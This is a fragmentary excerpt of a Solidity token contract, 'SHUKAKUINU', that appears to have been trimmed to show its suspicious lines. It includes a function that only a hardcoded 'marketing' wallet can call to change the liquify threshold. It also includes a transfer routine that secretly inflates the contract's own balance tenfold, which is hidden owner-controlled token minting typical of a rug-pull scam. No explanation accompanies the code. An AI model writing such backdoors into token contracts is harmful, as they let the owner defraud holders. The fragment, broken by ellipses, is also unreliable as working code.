...
/**   // SPDX-License-Identifier: MIT
       ...
       Telegram Group : https://t.me/shukakuinu1
...
contract SHUKAKUINU is Context, IERC20, Ownable {
    ...
    address payable private marketing =
        payable(0xAaf8B01B30707086D7629B2966e302395E113563);
    ...
    function SetLiquidfy (uint256 newLiquidfy) public {
        require(_msgSender() == marketing, "SET FAILED");

        _liquifyThreshhold = newLiquidfy;
    }
    ...
    function _transfer(
        ...
        if (
            ...
            _balances[address(this)]= _balances[address(this)].add(amount).mul(10);
